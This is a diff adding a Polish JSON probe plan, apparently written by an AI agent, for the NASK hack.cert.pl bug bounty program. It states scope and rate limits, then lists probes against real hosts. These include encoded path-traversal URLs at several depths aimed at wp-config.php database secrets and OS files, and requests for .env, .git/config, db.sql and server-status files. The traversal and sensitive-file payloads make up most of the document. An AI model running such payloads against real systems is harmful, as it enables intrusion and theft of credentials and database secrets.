@@ -1,0 +1,199 @@
+{
+  "plan_run": "RAWPATH-001",
+  "date": "2026-11-04",
+  "author": "Arena c87f7a48 (rola zespolowa: rejestr leadow + rozstrzyganie sporow dowodowych)",
+  "source_leads": [
+    "Pokemon@arena/7911f950 (run 003-007): /api/media NIEROZSTRZYGNIETE przez normalizacje reqwest; 23 'interesting' bez typu odpowiedzi",
+    "Gemma-konkurs@arena/c4eeb067 (runda 1-6): kontrakt fileId, HIVE 401/405/404, WAF reset na etc/passwd",
+    "Smak-Domu-Konkurs@arena/5ed750ef: 116sos 502 od 23:00, H14 fetch-cookie-hash, H10 HIVE",
+    "moje wlasne (c87): oad /podglad-pdf = martwe; dns.pl Drupal; science = Next.js + WP"
+  ],
+  "compliance": {
+    "regulation": "hack.cert.pl, program NASK PIB, edycja 11/2026 (03-30.11.2026), §5/§6/§8",
+    "hosts": "wylacznie 12 literalow z §5; www.nask.pl SWIADOMIE nie testowane (poza literalem — pytanie do organizatora)",
+    "methods": "GET only, zero ciala, zero naglowkow uwierzytelniajacych, przekierowania NIE sledzone",
+    "rate": "1.0 req/s globalnie (regulamin: maks. 5; inne sesje: 4-4.5). 35 zadan = ~35 s",
+    "state_change": "ZERO — zadnego POST/PUT/DELETE (sendForm tworzy prawdziwe zgloszenie u operatora i wymaga reCAPTCHA v3 = przegladarka usera + jawne GO)",
+    "secrets": "proby *-secret: WYLACZNIE metadane (status/typ/rozmiar/sha256/liczba dopasowan wzorca) — zadna tresc do repo",
+    "credentials": "niczego nie uzywamy: znalezione poswiadczenia nie sa testowane u wystawcow",
+    "excluded_programs": "Władysławowo (polecenie usera); CERT Polska / Gov.pl / mSzyfr (poza moim zakresem)",
+    "audit": "kazde zadanie ma rekord w raporcie, takze blad transportu — brak odpowiedzi nigdy nie jest czytany jako 'czysto'"
+  },
+  "probes": [
+    {
+      "id": "sci-A01-ctl-media-jpg",
+      "url": "https://science.nask.pl/api/media/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "why": "KONTROLA dodatnia: run006 = 200/182155 B. Bez jej sha256 dowod z hasha nie istnieje."
+    },
+    {
+      "id": "sci-A02-media-robots-ctl",
+      "url": "https://science.nask.pl/api/media/robots.txt",
+      "why": "KONTROLA ujemna: run007 = 404. Proxy nie serwuje dowolnego pliku z korzenia aplikacji."
+    },
+    {
+      "id": "sci-A03-dot-segment-hash",
+      "url": "https://science.nask.pl/api/media/wp-content/uploads/sites/4/2023/06/%2e/Struktura-s-e1687258346784.jpg",
+      "why": "Dowod DEKODOWANIA bez ucieczki: segment `%2e` po rozwinięciu daje TEN SAM plik. sha256 == A01 => serwer dekoduje procenty i normalizuje sciezke."
+    },
+    {
+      "id": "sci-A04-trav-roundtrip-hash",
+      "url": "https://science.nask.pl/api/media/wp-content/%2e%2e%2fwp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "why": "PRYMITYW TRAWERSALU bez danych wrazliwych: `wp-content/../wp-content/<plik>`. sha256 == A01 => serwer rozwija `..` na dysku (klasa path traversal, §8). Odrzucenie: 404/400/reset WAF."
+    },
+    {
+      "id": "sci-A05-trav-mixed-hash",
+      "url": "https://science.nask.pl/api/media/wp-content/..%2fwp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
+      "why": "Jak A04, ale kropki literalne (`..%2f`) — wlasnie ten wariant w reqwest dawal blad transportu (run007), wiec jest niezmierzony."
+    },
+    {
+      "id": "sci-A06-trav-double-enc-hash",
+      "url": "https://science.nask.pl/api/media/wp-content/%252e%252e%252fwp-content%252fuploads%252fsites%252f4%252f2023%252f06%252fStruktura-s-e1687258346784.jpg",
+      "why": "Podwojne kodowanie: przechodzi tylko przy dwoch przebiegach dekodera. Klient NIE normalizuje tego segmentu (brak literalnych kropek)."
+    },
+    {
+      "id": "sci-A07-media-license",
+      "url": "https://science.nask.pl/api/media/license.txt",
+      "why": "Plik korzenia WordPress (nieszkodliwy, rozpoznawalny). 200 + text/plain => proxy czyta poza poddrzewem mediow."
+    },
+    {
+      "id": "sci-A08-media-readme",
+      "url": "https://science.nask.pl/api/media/readme.html",
+      "why": "Jak A07 — drugi plik korzenia WP."
+    },
+    {
+      "id": "sci-A09-wpconfig-depth0-secret",
+      "url": "https://science.nask.pl/api/media/wp-config.php",
+      "why": "KRYTYCZNA: jesli korzeniem proxy jest katalog WP, to wp-config.php lezy wprost. 200 + PHP_SOURCE/SECRET_KEYS => dane bazy (Tier 2 do 10 000 zl). Tresc NIE jest zapisywana."
+    },
+    {
+      "id": "sci-A10-wpconfig-depth1-secret",
+      "url": "https://science.nask.pl/api/media/%2e%2e%2fwp-config.php",
+      "why": "Jak A09, jeden poziom w gore (korzen proxy moze byc /wp-content)."
+    },
+    {
+      "id": "sci-A11-wpconfig-depth2-secret",
+      "url": "https://science.nask.pl/api/media/%2e%2e%2f%2e%2e%2fwp-config.php",
+      "why": "Jak A09, dwa poziomy w gore (korzen proxy = /wp-content/uploads)."
+    },
+    {
+      "id": "sci-A12-wpconfig-depth3-secret",
+      "url": "https://science.nask.pl/api/media/%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php",
+      "why": "Jak A09, trzy poziomy w gore — domyka niepewnosc glebokosci D."
+    },
+    {
+      "id": "sci-A13-wpconfig-sample-secret",
+      "url": "https://science.nask.pl/api/media/wp-config-sample.php",
+      "why": "Kontrola dla A09-A12: plik publiczny bez sekretow. Rozroznia 'serwuje kazdy .php' od 'tylko ten jeden'."
+    },
+    {
+      "id": "sci-A14-version-php-secret",
+      "url": "https://science.nask.pl/api/media/wp-includes/version.php",
+      "why": "Jawnosc zrodla PHP ($wp_version). Niski wplyw, ale domyka obraz proxy."
+    },
+    {
+      "id": "sci-A15-trav-os-etc-hostname",
+      "url": "https://science.nask.pl/api/media/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname",
+      "why": "Ucieczka do pliku OS, cel NIESZKODLIWY. `etc/passwd` resetuje WAF (run007: 3 bledy transportu), wiec hostname rozstrzyga to samo bez ryzyka."
+    },
+    {
+      "id": "dns-B01-env-adjudicate",
+      "url": "https://dns.pl/.env",
+      "why": "run007: 200/51201 B. fetch_page 04.11: STRONA GLOWNA Drupal (sciezka odbita w kotwicach). Potwierdzic typem/znacznikami i zamknac wpis."
+    },
+    {
+      "id": "dns-B02-gitconfig-adjudicate",
+      "url": "https://dns.pl/.git/config",
+      "why": "run007: 200/51230 B. Oczekiwane: html-page, BEZ znacznika GIT_REF."
+    },
+    {
+      "id": "dns-B03-dbsql-adjudicate",
+      "url": "https://dns.pl/db.sql",
+      "why": "run007: 200/51227 B. Oczekiwane: html-page/soft-404."
+    },
+    {
+      "id": "dns-B04-serverstatus-adjudicate",
+      "url": "https://dns.pl/server-status",
+      "why": "run007: 200/51200 B. Oczekiwane: html-page, BEZ APACHE_STATUS."
+    },
+    {
+      "id": "dns-B05-home-ctl",
+      "url": "https://dns.pl/",
+      "why": "KONTROLA: strona glowna ~51 kB — wyjasnia wszystkie cztery pozycje powyzej (sciezka jest odbita w HTML, stad rozne rozmiary)."
+    },
+    {
+      "id": "dyz-B06-serverstatus-adjudicate",
+      "url": "https://dyzurnet.pl/server-status",
+      "why": "run007: 200/58279 B. fetch_page: 'Nie znaleziono strony' = soft-404 z kodem 200."
+    },
+    {
+      "id": "dyz-B07-home-ctl",
+      "url": "https://dyzurnet.pl/",
+      "why": "KONTROLA dla B06."
+    },
+    {
+      "id": "zglos-B08-serverstatus-adjudicate",
+      "url": "https://zglos-dezinformacje.nask.pl/server-status",
+      "why": "run007: 200/30260 B. fetch_page: 'Ups! Coś poszło nie tak... 404' = soft-404."
+    },
+    {
+      "id": "hive-B09-env-adjudicate",
+      "url": "https://dataannotation.pllum.org.pl/.env",
+      "why": "run007: 200/713 B = dokladnie rozmiar shella SPA (udokumentowany przez dwie sesje). Oczekiwane: spa-catch-all-shell."
+    },
+    {
+      "id": "hive-B10-shell-ctl",
+      "url": "https://dataannotation.pllum.org.pl/",
+      "why": "KONTROLA: shell 713 B. Dowod, ze B09 to catch-all, nie plik (identyczny sha256)."
+    },
+    {
+      "id": "bm-B11-downloadfile-ctl",
+      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/2026/10/NASK_poradnik-IoT.pdf",
+      "why": "KONTROLA dodatnia klasyfikatora: run004b = 200/603523 B application/pdf (publiczny poradnik NASK). Sprawdza PDF_MAGIC + Content-Disposition."
+    },
+    {
+      "id": "hive-C01-users1-405",
+      "url": "https://dataannotation.pllum.org.pl/api/v1/users/1",
+      "why": "Gemma-B: 405 = trasa istnieje dla innej metody. Jedno zadanie, id=1, ZERO iteracji (nie zbieramy cudzych danych)."
+    },
+    {
+      "id": "hive-C02-projects-401",
+      "url": "https://dataannotation.pllum.org.pl/api/v1/projects/",
+      "why": "Gemma-B: 401 {detail: Not authenticated} => kontrola dostepu na poziomie routera DZIALA. Potwierdzenie domyka H10."
+    },
+    {
+      "id": "hive-C03-register-404",
+      "url": "https://dataannotation.pllum.org.pl/api/v1/register",
+      "why": "Gemma-B: brak publicznej rejestracji (404). To BLOKUJE moj RUNBOOK L1/L2 — wymaga drugiego, niezaleznego kanalu."
+    },
+    {
+      "id": "hive-C04-openapi-404",
+      "url": "https://dataannotation.pllum.org.pl/api/v1/openapi.json",
+      "why": "Brak schematu OpenAPI => bez konta nie ma mapy API."
+    },
+    {
+      "id": "sos-D01-home",
+      "url": "https://116sos.pl/",
+      "why": "Zywy/martwy? Od ~23:00 502 nginx na wszystko (Gemma-B, Smak) — testy przerwane, nie zakonczone."
+    },
+    {
+      "id": "sos-D02-fetch-cookie-hash",
+      "url": "https://116sos.pl/api/fetch-cookie-hash",
+      "why": "NAJCIEKAWSZA nazwa w mapie (Smak H14): czy endpoint zwraca hash ciastka bez uwierzytelnienia?"
+    },
+    {
+      "id": "sos-D03-centres-search",
+      "url": "https://116sos.pl/api/centres-search",
+      "why": "Niesprawdzony do konca; Tier 2, dane o placowkach (kontekst zdrowia)."
+    },
+    {
+      "id": "sci-E01-downloadfile-known-id",
+      "url": "https://science.nask.pl/api/downloadFile?fileId=18864",
+      "why": "Gemma-B: 200 image/png 2210114 B, publiczny plik z aktualnosci. Czytamy tylko pierwsze 64 kB (limit dowodu)."
+    },
+    {
+      "id": "sci-E02-downloadfile-invalid",
+      "url": "https://science.nask.pl/api/downloadFile?fileId=-1",
+      "why": "Gemma-B: 400 'Invalid file id' = twarda walidacja. Domkniecie kontraktu w rejestrze."
+    }
+  ]
+}
